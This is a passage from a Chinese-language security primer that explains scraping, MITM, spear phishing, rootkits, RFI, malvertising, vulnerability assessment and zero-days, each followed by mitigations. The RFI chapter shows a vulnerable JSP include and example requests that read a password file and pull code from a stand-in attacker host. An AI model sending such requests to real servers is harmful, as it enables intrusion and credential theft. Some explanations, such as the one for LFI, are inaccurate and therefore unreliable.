  - 识别接入点 (AP) 网络配置\n\n### 第 24 章\n\n### 网页抓取\n\n这是指使用机器人从网站提取数据和内容。它不同于屏幕抓取，因为它不是复制屏幕上的像素，而是连同数据库中的数据一起提取底层的\
  \ HTML 代码。随后，抓取器可能在别处复制该网站内容。\n\n有许多类型的数字业务依赖数据采集，并为此使用网页抓取。一些合法用途包括：\n\n- 搜索引擎机器人抓取网站以分析其内容用于排名。\n\
  - 比价网站部署机器人从卖家网站获取产品描述和价格。\n- 市场研究机构可能使用抓取器从社交媒体和论坛获取数据。\n\n网页抓取可能被不法分子用于非法目的，如窃取受版权保护的内容和恶意压价。此类行为可能给在线实体带来严重后果，如经济损失——如果业务是内容分发商或依赖竞争性定价模型，后果更甚。\n\
  \n**抓取工具和模型** 是设计用于遍历数据库并获取数据的软件。会使用不同类型的机器人。它们被定制用于：\n\n- 识别独特的 HTML 网站结构\n- 存储抓取的数据\n\
  - 提取 API 信息\n- 提取并修改内容\n\n所有类型的抓取机器人都旨在从网站访问数据，因此很难区分恶意机器人和合法机器人。不过，有两个主要区别可能有助于区分两者：\n\
  \n- 如果机器人是合法的，它会标识使用它的公司。以 `Googlebot` 为例。在 HTTP 头中，它标识自己为 Google。\n- 可疑机器人伪装成真实流量并创建虚假的\
  \ HTTP 用户代理。\n- 来自合法组织的机器人遵守网站的 `robot.txt` 文件，其中列出了机器人可以访问和不能访问的所有页面。\n- 恶意机器人抓取网站时不顾及任何允许规则。\n\
  \n运行网页抓取机器人需要大量资源。当攻击者无法承担这些资源时，会选择僵尸网络。\n\n## 恶意网页抓取示例\n\n未经网站所有者许可进行的网页抓取属于恶意行为。最常见的情况包括内容窃取和价格抓取。\n\
  \n### 价格抓取\n\n在这种情况下，攻击者使用僵尸网络发送抓取机器人，调查竞争对手的数据库，目的是促进销售、恶意压低价格并获取定价信息。这类攻击常见于价格对购买决策影响巨大的行业。\n\
  \n### 内容抓取\n\n内容抓取涉及从特定网站窃取大量内容。依赖数字内容和在线产品目录的网站最容易成为目标。\n\n## 网页抓取防护\n\n由于抓取机器人的进步，大多数防护措施已变得无效。粒度流量分析是对抗机器人操作的最佳方法之一。其特点是对以下因素进行交叉验证：\n\
  \n- HTML 指纹\n- IP 信誉\n- 行为分析\n- 渐进式挑战\n\n### 第 25 章\n\n### 中间人 (MITM) 攻击\n\n\n\n\
  这是一个通用术语，指攻击者拦截应用程序与用户之间的对话。攻击者可以伪装成其中一方或窃听，使对话看起来正常。中间人攻击（MITM）的目的是窃取信用卡号、账户详情、登录凭证和其他敏感信息。攻击者通常针对电商网站、SaaS\
  \ 企业、金融应用及其他需要登录的网站的用户。攻击者收集的信息可用于未经授权的密码修改、非法资金转移和身份盗窃。此外，攻击者可在高级持续性威胁（APT）的渗透阶段利用它在安全网络中建立立足点。为了更好地理解\
  \ MITM 攻击，可以想象邮递员查看你的银行对账单，记下你的详细信息，然后重新封好信封投递给你。成功的 MITM 攻击有两个不同阶段：拦截和解密。在第一步中，攻击者利用其网络在用户流量到达预期目的地之前将其拦截。最简单且最常见的方法是创建恶意的免费\
  \ Wi-Fi 热点并向公众开放。这些热点通常不受密码保护。当用户将设备连接到此网络时，攻击者即可访问其在线数据交换。部分攻击者可能倾向于通过以下方法采取主动方式：\n\
  \n- **IP 欺骗**：攻击者更改 IP 地址数据包头部并伪装成应用程序。任何尝试访问该应用程序 URL 的用户都会被重定向到攻击者的网站。\n- **ARP\
  \ 欺骗**：攻击者使用伪造的 ARP 消息将合法用户的 IP 地址与其 MAC 地址关联。一旦发生这种情况，本应从用户发往主机 IP 地址的数据会转发给攻击者。\n\
  - **DNS 欺骗**：攻击者渗透 DNS 服务器并更改网站的地址记录。\n\n拦截步骤成功后，必须在应用程序和用户不知情的情况下隐蔽地解密双向 SSL 流量。有几种实现方法：\n\
  \n- **HTTPS 欺骗**：在首次成功连接到安全网站后，向受害者的浏览器发送伪造证书。\n- **SSL BEAST**：将恶意 JavaScript 注入用户计算机，从而拦截从\
  \ Web 应用程序发送的任何加密 Cookie。\n- **SSL 劫持**：在 TCP 握手期间，攻击者向应用程序和用户传递伪造的认证密钥。\n- **SSL\
  \ 剥离**：将 HTTPS 连接降级为 HTTP。\n\n## 中间人攻击防范\n\n### 针对用户：\n\n- 避免可疑的 Wi-Fi 连接\n- 留意浏览器关于不安全网站的警告\n\
  - 始终从应用程序登出\n- 避免使用公共网络\n\n网站运营者应通过确保传输数据的加密和认证来强化安全通信协议。\n\n---\n\n### 第 26 章\n\
  \n### 定向钓鱼攻击\n\n这是一种社会工程学攻击，攻击者伪装成受信任的个人，诱骗受害者点击短信或伪造邮件中的恶意链接。用户随后在不知情的情况下在其计算机/网络上安装恶意软件、执行\
  \ APT 的第一阶段或泄露敏感信息等。虽然定向钓鱼看起来像鲸钓攻击和普通钓鱼，但它与典型的社会工程学攻击略有不同，且执行方式异常。因此，在制定安全策略时需要给予特别关注。以下是一个定向钓鱼攻击及其后果的示例。一名声称代表数据库管理\
  \ SaaS 提供商 `www.itservices.com` 的人员向企业系统管理员发送伪造邮件。他使用的邮件模板属于 `itservices.com`。邮件称\
  \ `itservices.com` 正在限时提供一项新服务，并邀请用户使用附带链接注册。系统管理员点击链接后，会被带到一个网站 `itservice.com`\
  \ 的登录页面，该页面酷似 `itservices.com` 的注册页面。此时，攻击者在系统管理员的计算机上安装了控制与命令代理。随后，攻击者可将其作为后门进入企业网络并执行\
  \ APT 的第一阶段。\n\n## 钓鱼攻击、鲸钓攻击与定向钓鱼攻击的对比\n\n鲸钓攻击、钓鱼攻击和定向钓鱼攻击在目标受害者和复杂程度上有所不同。在钓鱼攻击中，攻击者伪装成受信任方向尽可能多的用户发送恶意邮件。例如，攻击者可能发送一封看似来自\
  \ PayPal 的邮件，要求用户点击链接验证凭证，这可能导致恶意软件安装在接收者计算机上。钓鱼邮件通常不具个性化，包含拼写错误等失误，且批量发送。许多人从未注意到这些提示。定向钓鱼邮件难以检测，它们看起来像来自目标身边的人，且邮件内容个性化。鲸钓攻击针对组织高层的决策者，这些高管可访问管理员账户密码、商业机密等高度敏感信息。攻击者伪装成组织或个人（如客户）发送邮件。鲸钓攻击利用来自新闻、网站或社交媒体的信息针对特定个人。虽然鲸钓攻击针对高层个人，但定向钓鱼攻击的目标则是低调的目标。\n\
  \n## 定向钓鱼攻击缓解措施\n\n- **双因素认证**：要求用户通过两层/步骤验证。\n- **密码管理策略**：确保员工不在恶意网站上使用企业密码。\n\
  - **教育活动**：培训员工并提高安全意识。\n\n---\n\n### 第 27 章\n\n### Rootkit\n\n这是一种恶意软件程序，允许隐蔽地获取对\
  \ PC 的特权访问。它会危及个人信息并影响计算机性能。一旦安装，Rootkit 会在操作系统启动时或稍后启动。某些类型的 Rootkit 甚至在操作系统启动前运行。Rootkit\
  \ 可能导致以下后果：\n\n- **隐藏恶意软件**：攻击者可在已感染的计算机上安装其他类型的恶意软件。这些恶意程序对杀毒软件和用户不可见。\n- **信息窃取**：攻击者可利用\
  \ Rootkit 窃取信用卡信息、登录凭证和其他敏感信息。\n- **文件删除**：Rootkit 可擦除系统中的文件和操作系统代码。\n- **窃听**：黑客可利用\
  \ Rootkit 窃听并拦截个人信息。\n- **文件执行**：攻击者可在目标计算机上远程执行文件。\n- **远程访问**：Rootkit 可能更改系统配置设置，如修改启动脚本。\n\
  \n## Rootkit 注入\n\nRootkit 可通过多种方式安装在系统上。\n\n### 搭便车\n\n\n\n有时，Rootkit 嵌入在可信软件中，用户在不知情的情况下安装了它们。当软件被授予管理员权限在系统上安装时，Rootkit\
  \ 也会隐蔽地安装。\n\n## 混合威胁\n\nRootkit 本身没有感染计算机的能力。攻击者可能会创建混合威胁，利用各种漏洞来攻破系统。在许多情况下，这是通过将\
  \ Rootkit 与 Loader 和 Dropper 合并来实现的。\n\n**Dropper（投放器）**：这是黑客用于在受害者计算机上安装 Rootkit\
  \ 的文件或程序。分发 Dropper 的方法有多种，包括通过暴力攻击或社会工程学攻击。\n\n**Loader（加载器）**：一旦用户启动了 Dropper\
  \ 程序（通过执行或打开文件），一段恶意代码（即 Loader）就会启动。\n\nRootkit 有多种类型，包括：\n\n*   **Application\
  \ or user-mode rootkit（应用层或用户模式 Rootkit）**：这些在应用层运行。它们可以更改 API 和应用程序行为。应用层 Rootkit\
  \ 容易被检测到，因为杀毒程序在同一层运行。\n*   **Kernel-mode（内核模式）**：它们部署在操作系统的内核模块中。在这里，它们可以控制各种系统进程。很难检测它们。\n\
  *   **Bootkits（引导套件）**：这些通过感染 MBR（主引导记录）来接管目标系统。它们使恶意软件能在操作系统加载前运行。\n*   **Firmware\
  \ rootkits（固件 Rootkit）**：它们渗透运行设备的系统，如系统 BIOS、硬盘、网卡和路由器。\n*   **Rootkit hypervisors（Rootkit\
  \ 虚拟机监控程序）**：它们通过利用硬件虚拟化功能来接管机器。\n\n## 反 Rootkit 措施\n\n为了保护系统免受 Rootkit 侵害，你需要扫描任何现有的恶意软件，并防止任何新程序被安装。\n\
  \n**Rootkit scanners（Rootkit 扫描器）**：这些是解析系统以移除活动 Rootkit 的程序。这些扫描器可能对某些 Rootkit\
  \ 帮助不大，你应该结合使用多个扫描器。\n\n**Preemptive blocking（预防性拦截）**：这涉及培训组织中的用户，避免打开或下载来自可疑来源的文件。\n\
  \n---\n\n### 第 28 章\n\n### 远程文件包含 (RFI)\n\nRFI（远程文件包含）是一种攻击，它针对动态引用外部脚本的 Web 应用程序中的漏洞。攻击者的目标是利用应用程序的引用功能，从不同域的远程\
  \ URL 上传恶意软件。成功的 RFI 攻击可能导致网站被接管、服务器被攻破或信息被盗。\n\nLFI（本地文件包含）类似于 RFI。它是通过 Web 浏览器将受感染文件上传到服务器。大多数情况下，这两者会被一起提及。两者都允许将恶意软件上传到目标服务器。唯一的区别是，LFI\
  \ 攻击利用本地文件上传中的不安全函数。这允许进行恶意攻击。攻击者随后能够直接将恶意软件上传到受攻破的系统，而不是通过受攻破的外部引用函数从远程位置访问它（如\
  \ RFI 中那样）。\n\n## 远程文件包含示例\n\n为了理解 RFI 渗透是如何执行的，请考虑以下示例：\n\n包含以下代码行的 JSP：\n```\n\
  <jsp:include page=\"<%=(String)request.getParmeter(\"ParamName\")%>\">\n```\n可通过以下请求进行操纵：\n\
  `Page1.jsp?ParamName=/WEB-INF/DB/password`\n\n处理此请求时，攻击者可以看到密码内容文件。\n\n具有请求 URL\
  \ 内容的导入语句的 Web 应用程序：\n```\n<c:import url=\"<%=request.getParameter(\"conf\")%>\"\
  >\n```\n\n如果此语句未经过清理，可用于注入恶意软件。\n\n例如：`Page2.jsp?conf=https://evilsite.com/attack.js`。操纵请求参数使其引用远程文件，也是发起\
  \ RFI 攻击的一种方法。\n\n## RFI 的 DIY 预防与缓解\n\n使用适当的清理和输入验证，可以降低 RFI 攻击的风险。然而，当你选择这样做时，必须记住无法完全清理所有用户输入。因此，你应该将清理作为更好安全解决方案的补充。话虽如此，始终建议尽可能彻底地清理受控/用户提供的输入。输入包括：\n\
  \n*   HTTP 头值\n*   Cookie 值\n*   URL 参数\n*   GET/POST 参数\n\n在清理过程中，根据白名单（允许的字符集）检查输入字段，而不是黑名单（不允许的恶意字符）。基本上，黑名单验证不是一个强有力的解决方案。攻击者可以决定以其他格式（如十六进制或编码格式）提供输入。\n\
  \n另一个好的做法是在服务器端应用输出验证机制。客户端的验证功能也无法免疫代理工具攻击，因为它们具有减轻处理开销的优势。\n\n最后，限制上传目录的执行权限。此外，考虑建立允许的文件类型白名单，例如\
  \ `JPG`、`DOC`、`PDF` 等，并限制上传文件的大小。适当的文件管理和输入清理实践单独使用是不够的。大多数攻击仍然会发生，因为 DIY 实践助长了一种虚假的安全感。寻找其他高效解决方案，如\
  \ `Imperva WAF`（Web 应用防火墙）。\n\n---\n\n### 第 29 章\n\n### 恶意广告\n\n这是指攻击者将恶意代码插入在线广告网络中。该代码随后将用户重定向到欺诈网站。这种攻击让黑客有机会针对知名网站的用户，如\
  \ `The London Stock Exchange`、`The Atlantic`、`The New York Times Online` 和 `Spotify`。\n\
  \n在线广告的生态系统是一个非常复杂的网络。它涉及内容分发网络（`CDNs`）、重定向网络、广告服务器、广告交易平台和发布商网站。当互联网用户点击某个广告时，会在各种服务器之间发生多次重定向。攻击者利用这种复杂性，将恶意软件放置在广告网络和发布商不会怀疑的地方。\n\
  \n人们经常将 Malvertising 与 Adware 或广告恶意软件混淆。\n\n**Adware（广告软件）** 是运行在用户计算机上的程序。在大多数情况下，它嵌入在合法软件中，用户在不知情的情况下安装它。它挖掘用户数据以定向广告，弹出不需要的广告，并将用户的搜索请求重定向到其他广告网站。\n\
  \n**Ad malware（广告恶意软件）** 和 **Malvertising（恶意广告）** 在几个方面有所不同：\n\n*   Adware 针对个别用户，而\
  \ Malvertising 中的恶意代码部署在广告商的网页上。\n*   只有访问受感染网页的人会受到 Malvertising 的影响，而 Adware 会继续在受感染的计算机上运行。\n\
  \n## 恶意广告对 Web 用户的影响\n\n\n\n\n### 恶意广告\n\n当用户查看恶意广告时，即使不必点击它，也可能发生以下情况：\n\n- **“路过式”下载**—\
  \ 广告软件或恶意软件被安装在用户的计算机上。浏览器漏洞使此类攻击成为可能。\n- 浏览器被强制重定向到恶意网站。\n- 可能会显示恶意内容、不需要的广告或弹出窗口。\n\
  \n当用户点击恶意广告时，可能发生以下情况：\n\n- 他们可能会执行一段代码，将广告软件或恶意软件安装到他们的计算机中。\n- 用户可能会被重定向到恶意网站，而不是广告建议的网站。\n\
  - 用户可能会被重定向到恶意网站，攻击者在该网站上实施网络钓鱼攻击。\n\n## 恶意广告对发布商的影响\n\n发布商将遭受收入和流量损失，声誉也会受损。他们还可能因用户遭受的损害而承担法律责任。发布商很难屏蔽甚至测试恶意广告。\n\
  \n## 恶意软件如何注入广告\n\n- 广告调用中的恶意软件\n- 点击后注入的恶意软件\n- 广告创意中的恶意软件\n- 像素中的恶意软件\n- 视频中的恶意软件\n\
  - Flash 视频中的恶意软件\n- 登录页面上的恶意软件\n\n## 恶意广告的缓解与预防\n\n缓解或预防恶意广告并非易事，因此发布商和最终用户都必须采取行动。\n\
  \n### 面向最终用户\n\n- 安装防病毒软件，以保护您的电脑免受恶意代码和“路过式”下载的侵害。\n- 善用广告拦截器。\n- 避免使用 Java 和 Flash。\n\
  - 更新插件和浏览器。\n\n### 面向发布商\n\n- 仔细审查广告网络，并详细询问广告投放的承诺/保证。\n- 扫描展示类广告。\n- 也许只在广告框架中展示特定类型的文件。\n\
  \n---\n\n### 第 30 章：漏洞评估\n\n这是系统地审查信息系统中安全弱点的过程。对系统进行评估，以查看是否存在任何漏洞以及漏洞的严重程度。如有需要，则推荐缓解或修复措施。漏洞评估有助于防止多种威胁，包括：\n\
  \n- **不安全的默认设置**：这是指带有不安全设置的软件，例如，可猜测的管理员密码。\n- **XSS**、**SQL 注入** 及类似攻击\n- **权限提升**\n\
  \n漏洞评估有不同类型，例如：\n\n- **主机评估**：这是对关键服务器进行评估。如果未经过充分测试，它们就会变得容易受到攻击。\n- **网络和无线评估**：评估实践和策略，以阻止对公共或私有网络以及通过网络可访问的资源的未授权访问。\n\
  - **数据库评估**：评估大数据系统和数据库的错误配置和漏洞，旨在识别不安全的开发/测试环境或非法数据库，并对组织中的敏感信息进行分类。\n- **应用扫描**：识别\
  \ Web 应用程序中的安全漏洞，并使用自动化扫描来获取其前端的源代码。\n\n## 漏洞评估：安全扫描的过程\n\n此过程涉及四个步骤。\n\n### 漏洞识别（测试）\n\
  \n此步骤的目的是列出应用程序漏洞的综合清单。分析师检查应用程序和任何其他系统的安全运行状况。他们要么使用自动化工具进行扫描，要么手动进行。这些分析师还依赖威胁情报源、资产管理系统、供应商漏洞公告和漏洞数据库来发现安全弱点。\n\
  \n### 漏洞分析\n\n此步骤旨在找出上一步中发现的漏洞的根本原因和来源。识别导致漏洞的系统组件。例如，漏洞可能是由开源库的旧版本导致的。有了这一发现，就很容易修补漏洞。\n\
  \n### 风险评估\n\n此步骤的目的是确定漏洞的优先级。安全分析师为每个弱点分配严重性评分或等级。他们考虑的因素如下：\n\n- 漏洞可能导致的潜在损害\n\
  - 攻击的严重程度\n- 妥协或攻击的难易程度\n- 面临风险的业务功能\n- 面临风险的数据\n- 受影响的系统\n\n### 修复\n\n在此步骤中，所有安全缺口都将被关闭。这是开发和运维团队以及安全人员的共同努力。他们确定针对每个漏洞的最佳缓解或修复方法。\n\
  \n修复的具体步骤包括：\n\n- 引入新的安全工具、措施和程序。\n- 更新配置或操作变更。\n- 开发并实施漏洞补丁。\n\n> **注意**：漏洞评估不是一次性活动。\n\
  \n## 漏洞评估工具\n\n这些工具旨在扫描针对您应用程序的现有和新威胁。它们包括：\n\n- **Web 应用程序扫描器**：它们扫描并模拟攻击模式。\n\
  - **协议扫描器**：它们查找易受攻击的网络服务、端口和协议。\n- **网络扫描器**：它们识别警告信号，例如可疑数据包生成、欺骗数据包和游离 IP 地址。\n\
  \n---\n\n### 第 31 章：零日漏洞利用\n\n这是一种网络攻击，针对软件的漏洞——该漏洞对于防病毒供应商或软件供应商而言是未知的。攻击者在其他人之前扫描软件以寻找漏洞，制定攻击计划，然后利用它渗透软件。这些攻击通常具有很高的成功几率，因为没有防御措施。因此，零日攻击应被严肃对待。常见目标包括特定文件类型（Flash、PDF、Excel\
  \ 或 Word）、Web 浏览器和电子邮件附件。\n\n## 典型目标\n\n- **物联网 (IoT)**、固件和硬件设备\n- 拥有易受攻击系统的家庭用户\n\
  - 拥有敏感业务信息访问权限的人员\n- 大型企业\n- 政府部门\n\n## 零日攻击示例\n\n\n\n\n# Stuxnet\n\nStuxnet 是一种针对制造过程中使用的\
  \ PC 的蠕虫病毒。受影响最严重的国家包括印度尼西亚、印度和伊朗。伊朗的铀浓缩工厂是主要目标，意图是破坏该国的核计划。\n\n# Sony 零日攻击\n\n\
  2014 年，索尼影业遭遇了一次零日攻击。此次攻击瘫痪了其网络，并导致敏感企业信息泄露，包括高管的个人电子邮件地址、商业计划和即将上映的电影。被利用的漏洞的确切细节仍不清楚。\n\
  \n# RSA 安全事件\n\n2011 年，安全公司 RSA 的网络被黑客入侵。攻击者利用了 Adobe Flash Player 中的一个未修补漏洞。RSA\
  \ 员工收到了来自攻击者的电子邮件，邮件附件为嵌入了 Flash 文件的 Excel 电子表格。当员工打开附件时，Poison Ivy（毒藤）恶意软件被安装在其系统上。\n\
  \n# Operation Aurora（极光行动）\n\n此次攻击发生于 2009 年，针对大型公司的知识产权。目标公司包括陶氏化学、雅虎、Adobe Systems\
  \ 和 Google。漏洞存在于 Perforce 和 Internet Explorer 中。\n\n零日漏洞利用针对的是尚无杀毒软件特征库或补丁的漏洞，因此难以检测。然而，您可以通过以下几种方式检测先前未知的软件漏洞：\n\
  \n## 漏洞扫描\n\n通过漏洞扫描可以检测出多种零日漏洞利用。提供漏洞扫描服务的公司通过模拟攻击来识别任何新漏洞。这种方法并不适用于所有零日漏洞利用。\n\n\
  ## 补丁管理\n\n这涉及在发现软件漏洞后立即进行修补。这不一定能防止零日攻击，但可以降低攻击发生的几率。问题在于，发现漏洞并开发、分发杀毒软件需要时间。如果这个过程耗时过长，攻击就可能发生。\n\
  \n## 输入验证与清理\n\n这种方法非常有效（可能是最好的）。它涉及在网络边缘部署 WAF（Web 应用防火墙）。该 WAF 将审查所有传入的流量，并过滤掉可能存在的恶意输出。\n\
  \n## 零日计划\n\n这是一个奖励负责任地披露漏洞的安全研究人员的计划，而不是将这些信息出售给不法分子。\n\n---\n\n| ![image](img/chapter_title_corner_decoration_left.png)\
